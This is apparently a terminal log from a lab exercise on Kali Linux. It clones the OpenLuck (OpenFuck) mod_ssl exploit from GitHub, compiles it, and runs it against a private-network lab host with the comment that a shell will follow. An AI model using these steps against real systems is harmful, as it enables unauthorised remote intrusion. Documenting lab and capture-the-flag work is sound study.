root@kali:-/kio2# git clone https://github.com/heltonWernik/OpenLuck Cloning into 'OpenLuck'..
remote: Enumerating objects: 22, done.
remote: Total 22 (delta 0), reused 0 (delta 0), pack-reused 22
Unpacking objects: 100% (22/22), done.
root@kali:-/kio2#

root@kali:-/kio2# apt-get install libssl-dev
Reading package lists... Done

root@kali:-/kio2# ls
OpenLuck

root@kali:-/kio2# cd OpenLuck/

root@kali:-/kio2/0penLuck# ls
OpenFuck.c README.md

root@kali:~/kio2/0penLuck# gcc OpenFuck.c -o open -lcrypto

root@kali:-/kio2/0penLuck# ls
open OpenFuck.c README.md

root@kali:-/kio2/0penLuck#

root@kali:~/kio2/0penLuck# ./open

Usage: ./open target box [port] [-c N]

root@kali:-/kio2/0penLuck# ./open 0x6b 192.168.202.130 -c 40



# here we will get a shell

